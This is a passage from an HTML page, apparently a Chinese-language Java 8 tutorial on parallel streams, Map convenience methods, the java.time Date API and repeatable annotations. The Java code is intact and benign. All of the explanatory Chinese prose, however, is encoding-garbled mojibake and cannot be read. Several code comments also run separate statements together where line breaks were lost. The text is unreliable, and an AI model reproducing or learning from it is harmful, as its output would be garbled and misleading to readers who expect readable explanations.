id="Parallel-Streams">Parallel Streams</h2><div class="story post-story"><p>å¦‚ä¸Šæ‰€è¿°ï¼Œæµå¯ä»¥æ˜¯é¡ºåºçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¹¶è¡Œçš„ã€‚é¡ºåºæµä¸Šçš„æ“ä½œåœ¨å•ä¸ªçº¿ç¨‹ä¸Šæ‰§è¡Œï¼Œè€Œå¹¶è¡Œæµä¸Šçš„æ“ä½œåœ¨å¤šä¸ªçº¿ç¨‹ä¸Šå¹¶å‘æ‰§è¡Œã€‚</p><p>ä¸‹é¢çš„ç¤ºä¾‹æ¼”ç¤ºäº†é€šè¿‡ä½¿ç”¨å¹¶è¡Œæµæ¥æé«˜æ€§èƒ½æ˜¯å¤šä¹ˆå®¹æ˜“ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ç³»åˆ—ç‹¬ç‰¹å…ƒç´ :</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">1000000</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> values <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">UUID</span> uuid <span class="token operator">=</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    values<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ç°åœ¨æˆ‘ä»¬æµ‹é‡å¯¹è¿™ä¸ªé›†åˆçš„æµè¿›è¡Œæ’åºæ‰€èŠ±è´¹çš„æ—¶é—´ã€‚</p><h3 id="Sequential-Sort">Sequential Sort</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">long</span> t0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> count <span class="token operator">=</span> values<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> millis <span class="token operator">=</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>NANOSECONDS<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"sequential sort took: %d ms"</span><span class="token punctuation">,</span> millis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// sequential sort took: 899 ms</span></code></pre><h3 id="Parallel-Sort">Parallel Sort</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">long</span> t0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> count <span class="token operator">=</span> values<span class="token punctuation">.</span><span class="token function">parallelStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> millis <span class="token operator">=</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>NANOSECONDS<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"parallel sort took: %d ms"</span><span class="token punctuation">,</span> millis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// parallel sort took: 472 ms</span></code></pre><p>æ­£å¦‚æ‚¨å¯ä»¥çœ‹åˆ°çš„ï¼Œè¿™ä¸¤ä¸ªä»£ç ç‰‡æ®µå‡ ä¹æ˜¯ç›¸åŒçš„ï¼Œä½†å¹¶è¡Œæ’åºå¤§çº¦å¿«50%ã€‚æ‚¨éœ€è¦åšçš„å°±æ˜¯å°†<code>stream()</code>æ›´æ”¹ä¸º<code>parallelStream()</code>ã€‚</p></div><h2 id="Map-2">Map</h2><div class="story post-story"><p>å¦‚å‰æ‰€è¿°ï¼Œæ˜ å°„ä¸æ”¯æŒæµã€‚ç›¸åï¼Œæ˜ å°„ç°åœ¨æ”¯æŒå„ç§æ–°çš„ã€æœ‰ç”¨çš„æ–¹æ³•æ¥å®Œæˆå¸¸è§çš„ä»»åŠ¡ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    map<span class="token punctuation">.</span><span class="token function">putIfAbsent</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">"val"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>map<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> val<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä¸Šé¢çš„ä»£ç åº”è¯¥æ˜¯ä¸è¨€è‡ªæ˜çš„:<code>putIfAbsent</code>é˜»æ­¢æˆ‘ä»¬å†™é¢å¤–çš„<code>if null</code>æ£€æŸ¥;<code>forEach</code>æ¥å—ä¸€ä¸ªæ¶ˆè´¹è€…æ¥ä¸ºæ˜ å°„çš„æ¯ä¸ªå€¼æ‰§è¡Œæ“ä½œã€‚</p><p>è¿™ä¸ªä¾‹å­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨å‡½æ•°åœ¨maoä¸Šè®¡ç®—ä»£ç :</p><pre class="language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">computeIfPresent</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>num<span class="token punctuation">,</span> val<span class="token punctuation">)</span> <span class="token operator">-></span> val <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// val33map.computeIfPresent(9, (num, val) -> null);map.containsKey(9);     // falsemap.computeIfAbsent(23, num -> "val" + num);map.containsKey(23);    // truemap.computeIfAbsent(3, num -> "bam");map.get(3);             // val33</span></code></pre><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å­¦ä¹ å¦‚ä½•åˆ é™¤ä¸€ä¸ªç»™å®šé”®çš„æ¡ç›®ï¼Œä»…å½“å®ƒå½“å‰æ˜ å°„åˆ°ä¸€ä¸ªç»™å®šå€¼æ—¶:</p><pre class="language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"val3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// val33map.remove(3, "val33");map.get(3);             // null</span></code></pre><p>å¦ä¸€ä¸ªæœ‰ç”¨çš„æ–¹æ³•:</p><pre class="language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token string">"not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// not found</span></code></pre><p>åˆå¹¶ä¸€ä¸ªmapæ¡ç›®æ˜¯å¾ˆå®¹æ˜“çš„:</p><pre class="language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">"val9"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>value<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span> <span class="token operator">-></span> value<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// val9map.merge(9, "concat", (value, newValue) -> value.concat(newValue));map.get(9);             // val9concat</span></code></pre><p>åˆå¹¶è¦ä¹ˆæŠŠé”®/å€¼æ”¾åˆ°æ˜ å°„ä¸­ï¼Œå¦‚æœé”®ä¸å­˜åœ¨ï¼Œè¦ä¹ˆè°ƒç”¨åˆå¹¶å‡½æ•°æ¥æ”¹å˜ç°æœ‰çš„å€¼ã€‚</p></div><h2 id="Date-API">Date API</h2><div class="story post-story"><p>Java 8åœ¨<code>Java .time</code>åŒ…ä¸‹åŒ…å«äº†ä¸€ä¸ªå…¨æ–°çš„æ—¥æœŸå’Œ<code>Date API</code>ã€‚æ–°çš„<code>Date API</code>å¯ä»¥ä¸J  <a href="http://www.joda.org/joda-time/">Joda-Time</a>åº“ç›¸æ¯”è¾ƒï¼Œä½†æ˜¯å®ƒä»¬<a href="http://blog.joda.org/2009/11/why-jsr-310-isn-joda-time_4941.html">æ˜¯ä¸åŒçš„</a>ã€‚ä¸‹é¢çš„ç¤ºä¾‹æ¶µç›–äº†è¿™ä¸ªæ–°APIçš„æœ€é‡è¦éƒ¨åˆ†ã€‚</p><h3 id="Clock">Clock</h3><p>Clockæä¾›å¯¹å½“å‰æ—¥æœŸå’Œæ—¶é—´çš„è®¿é—®ã€‚æ—¶é’ŸçŸ¥é“ä¸€ä¸ªæ—¶åŒºï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿<code>System.currentTimeMillis()</code>æ¥æ£€ç´¢å½“å‰çš„æ¯«ç§’æ•°ã€‚è¿™ç§æ—¶é—´çº¿ä¸Šçš„ç¬æ—¶ç‚¹ä¹Ÿå¯ä»¥ç”¨<code>Instantç±»</code>è¡¨ç¤ºã€‚<code>instant</code>å¯ç”¨äºåˆ›å»ºé—ç•™çš„<code>java.util.Date</code>å¯¹è±¡ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Clock</span> clock <span class="token operator">=</span> <span class="token class-name">Clock</span><span class="token punctuation">.</span><span class="token function">systemDefaultZone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> millis <span class="token operator">=</span> clock<span class="token punctuation">.</span><span class="token function">millis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Instant</span> instant <span class="token operator">=</span> clock<span class="token punctuation">.</span><span class="token function">instant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Date</span> legacyDate <span class="token operator">=</span> <span class="token class-name">Date</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>instant<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// legacy java.util.Date</span></code></pre><h3 id="Timezones">Timezones</h3><p>æ—¶åŒºç”¨<code>ZoneId</code>è¡¨ç¤ºã€‚å¯ä»¥é€šè¿‡é™æ€å·¥å‚æ–¹æ³•è½»æ¾åœ°è®¿é—®å®ƒä»¬ã€‚æ—¶åŒºå®šä¹‰äº†åœ¨ç¬é—´å’Œæœ¬åœ°æ—¥æœŸå’Œæ—¶é—´ä¹‹é—´è¿›è¡Œè½¬æ¢æ—¶éå¸¸é‡è¦çš„åç§»é‡ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">ZoneId</span><span class="token punctuation">.</span><span class="token function">getAvailableZoneIds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// prints all available timezone idsZoneId zone1 = ZoneId.of("Europe/Berlin");ZoneId zone2 = ZoneId.of("Brazil/East");System.out.println(zone1.getRules());System.out.println(zone2.getRules());// ZoneRules[currentStandardOffset=+01:00]// ZoneRules[currentStandardOffset=-03:00]</span></code></pre><h3 id="LocalTime">LocalTime</h3><p>LocalTimeè¡¨ç¤ºæ²¡æœ‰æ—¶åŒºçš„æ—¶é—´ï¼Œä¾‹å¦‚æ™šä¸Š10ç‚¹æˆ–17:30:15ã€‚ä¸‹é¢çš„ç¤ºä¾‹ä¸ºä¸Šé¢å®šä¹‰çš„æ—¶åŒºåˆ›å»ºä¸¤ä¸ªæœ¬åœ°æ—¶é—´ã€‚ç„¶åæˆ‘ä»¬æ¯”è¾ƒè¿™ä¸¤ä¸ªæ—¶é—´ï¼Œå¹¶è®¡ç®—è¿™ä¸¤ä¸ªæ—¶é—´çš„</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalTime</span> now1 <span class="token operator">=</span> <span class="token class-name">LocalTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span>zone1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalTime</span> now2 <span class="token operator">=</span> <span class="token class-name">LocalTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span>zone2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>now1<span class="token punctuation">.</span><span class="token function">isBefore</span><span class="token punctuation">(</span>now2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// falselong hoursBetween = ChronoUnit.HOURS.between(now1, now2);long minutesBetween = ChronoUnit.MINUTES.between(now1, now2);System.out.println(hoursBetween);       // -3System.out.println(minutesBetween);     // -239</span></code></pre><p>LocalTimeé™„å¸¦äº†å„ç§å·¥å‚æ–¹æ³•æ¥ç®€åŒ–æ–°å®ä¾‹çš„åˆ›å»ºï¼ŒåŒ…æ‹¬æ—¶é—´å­—ç¬¦ä¸²çš„è§£æã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalTime</span> late <span class="token operator">=</span> <span class="token class-name">LocalTime</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>late<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 23:59:59DateTimeFormatter germanFormatter =    DateTimeFormatter        .ofLocalizedTime(FormatStyle.SHORT)        .withLocale(Locale.GERMAN);LocalTime leetTime = LocalTime.parse("13:37", germanFormatter);System.out.println(leetTime);   // 13:37</span></code></pre><h3 id="LocalDate">LocalDate</h3><p>LocalDateè¡¨ç¤ºä¸€ä¸ªä¸åŒçš„æ—¥æœŸï¼Œä¾‹å¦‚<code>2014-03-11</code>ã€‚å®ƒæ˜¯ä¸å¯å˜çš„ï¼Œå·¥ä½œæ–¹å¼ä¸<code>LocalTime</code>å®Œå…¨ç±»ä¼¼ã€‚è¯¥ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•é€šè¿‡å¢åŠ æˆ–å‡å°‘æ—¥ã€æœˆæˆ–å¹´æ¥è®¡ç®—æ–°çš„æ—¥æœŸã€‚è¯·è®°ä½ï¼Œæ¯ä¸ªæ“ä½œéƒ½è¿”å›ä¸€ä¸ªæ–°å®ä¾‹ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> tomorrow <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">plus</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">ChronoUnit</span><span class="token punctuation">.</span>DAYS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> yesterday <span class="token operator">=</span> tomorrow<span class="token punctuation">.</span><span class="token function">minusDays</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> independenceDay <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2014</span><span class="token punctuation">,</span> <span class="token class-name">Month</span><span class="token punctuation">.</span>JULY<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DayOfWeek</span> dayOfWeek <span class="token operator">=</span> independenceDay<span class="token punctuation">.</span><span class="token function">getDayOfWeek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dayOfWeek<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// FRIDAY</span></code></pre><p>ä»å­—ç¬¦ä¸²ä¸­è§£æ<code>LocalDate</code>å°±åƒè§£æ<code>LocalTime</code>ä¸€æ ·ç®€å•:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">DateTimeFormatter</span> germanFormatter <span class="token operator">=</span>    <span class="token class-name">DateTimeFormatter</span>        <span class="token punctuation">.</span><span class="token function">ofLocalizedDate</span><span class="token punctuation">(</span><span class="token class-name">FormatStyle</span><span class="token punctuation">.</span>MEDIUM<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withLocale</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span>GERMAN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> xmas <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"24.12.2014"</span><span class="token punctuation">,</span> germanFormatter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>xmas<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 2014-12-24</span></code></pre><h3 id="LocalDateTime">LocalDateTime</h3><p><code>LocalDateTime</code>è¡¨ç¤º**<code>æ—¥æœŸ-æ—¶é—´</code>**ã€‚å®ƒå°†ä¸Šé¢çš„æ—¥æœŸå’Œæ—¶é—´åˆå¹¶åˆ°ä¸€ä¸ªå®ä¾‹ä¸­ã€‚<code>LocalDateTime</code>æ˜¯ä¸å¯å˜çš„ï¼Œå·¥ä½œåŸç†ç±»ä¼¼äº<code>LocalTime</code>å’Œ<code>LocalDate</code>ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–¹æ³•ä»æ—¥æœŸ-æ—¶é—´ä¸­æ£€ç´¢æŸäº›å­—æ®µ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDateTime</span> sylvester <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2014</span><span class="token punctuation">,</span> <span class="token class-name">Month</span><span class="token punctuation">.</span>DECEMBER<span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DayOfWeek</span> dayOfWeek <span class="token operator">=</span> sylvester<span class="token punctuation">.</span><span class="token function">getDayOfWeek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dayOfWeek<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// WEDNESDAYMonth month = sylvester.getMonth();System.out.println(month);          // DECEMBERlong minuteOfDay = sylvester.getLong(ChronoField.MINUTE_OF_DAY);System.out.println(minuteOfDay);    // 1439</span></code></pre><p>é€šè¿‡é™„åŠ çš„æ—¶åŒºä¿¡æ¯ï¼Œå¯ä»¥å°†å…¶è½¬æ¢ä¸ºç¬é—´ã€‚ç¬é—´å¯ä»¥å¾ˆå®¹æ˜“åœ°è½¬æ¢ä¸º<code>java.util.Date</code>ç±»å‹çš„é—ç•™æ—¥æœŸã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Instant</span> instant <span class="token operator">=</span> sylvester        <span class="token punctuation">.</span><span class="token function">atZone</span><span class="token punctuation">(</span><span class="token class-name">ZoneId</span><span class="token punctuation">.</span><span class="token function">systemDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">toInstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Date</span> legacyDate <span class="token operator">=</span> <span class="token class-name">Date</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>instant<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>legacyDate<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Wed Dec 31 23:59:59 CET 2014</span></code></pre><p>æ ¼å¼åŒ–æ—¥æœŸ-æ—¶é—´å°±åƒæ ¼å¼åŒ–æ—¥æœŸæˆ–æ—¶é—´ä¸€æ ·ã€‚æˆ‘ä»¬å¯ä»¥ä»è‡ªå®šä¹‰æ¨¡å¼åˆ›å»ºæ ¼å¼åŒ–å™¨ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é¢„å®šä¹‰çš„æ ¼å¼ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">DateTimeFormatter</span> formatter <span class="token operator">=</span>    <span class="token class-name">DateTimeFormatter</span>        <span class="token punctuation">.</span><span class="token function">ofPattern</span><span class="token punctuation">(</span><span class="token string">"MMM dd, yyyy - HH:mm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDateTime</span> parsed <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"Nov 03, 2014 - 07:13"</span><span class="token punctuation">,</span> formatter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> string <span class="token operator">=</span> formatter<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>parsed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Nov 03, 2014 - 07:13</span></code></pre><p>ä¸<code>java.text.NumberFormat</code>ä¸åŒï¼Œæ–°çš„<code>DateTimeFormatter</code>æ˜¯<strong>ä¸å¯å˜çš„å’Œçº¿ç¨‹å®‰å…¨çš„</strong>ã€‚</p></div><h2 id="Annotations">Annotations</h2><div class="story post-story"><p>Java 8ä¸­çš„æ³¨é‡Šæ˜¯å¯é‡å¤çš„ã€‚è®©æˆ‘ä»¬ç›´æ¥è¿›å…¥ä¸€ä¸ªä¾‹å­æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªåŒ…è£…æ³¨é‡Šï¼Œå®ƒåŒ…å«ä¸€ä¸ªå®é™…æ³¨é‡Šçš„æ•°ç»„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@interface</span> <span class="token class-name">Hints</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Hint</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@Repeatable</span><span class="token punctuation">(</span><span class="token class-name">Hints</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@interface</span> <span class="token class-name">Hint</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Java 8å…è®¸æˆ‘ä»¬é€šè¿‡å£°æ˜æ³¨é‡Š@Repeatableæ¥ä½¿ç”¨ç›¸åŒç±»å‹çš„å¤šä¸ªæ³¨é‡Šã€‚</p><p>å˜ä½“1:ä½¿ç”¨å®¹å™¨æ³¨é‡Š(æ—§å¼)</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Hints</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token annotation punctuation">@Hint</span><span class="token punctuation">(</span><span class="token string">"hint1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token annotation punctuation">@Hint</span><span class="token punctuation">(</span><span class="token string">"hint2"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre><p>å˜ä½“2:ä½¿ç”¨å¯é‡å¤çš„æ³¨é‡Š(æ–°å­¦æ ¡)</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Hint</span><span class="token punctuation">(</span><span class="token string">"hint1"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Hint</span><span class="token punctuation">(</span><span class="token string">"hint2"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span><span class="token 